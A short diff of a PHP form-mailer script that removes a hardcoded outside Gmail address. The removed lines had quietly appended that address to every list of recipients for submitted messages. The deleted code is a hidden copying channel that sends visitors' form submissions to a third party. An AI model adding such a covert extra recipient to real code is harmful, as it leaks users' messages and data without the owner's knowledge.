@@ -266,17 +266,15 @@ if ($fileError !== UPLOAD_ERR_NO_FILE) {
   }
 }
 
-$notify = 'fiazmalana193@gmail.com';
 $recipients = $isCareer ? [$mailbox] : ($config['to'] ?? discover_mailboxes($domain, $mailbox));
 if (!is_array($recipients) || $recipients === []) {
   $recipients = [$mailbox];
 }
-$recipients[] = $notify;
 $recipients = array_values(array_unique(array_filter($recipients, static function ($addr) {
   return (bool) filter_var($addr, FILTER_VALIDATE_EMAIL);
 })));
 if ($recipients === []) {
-  $recipients = [$mailbox, $notify];
+  $recipients = [$mailbox];
 }
 
 $delivered = 0;
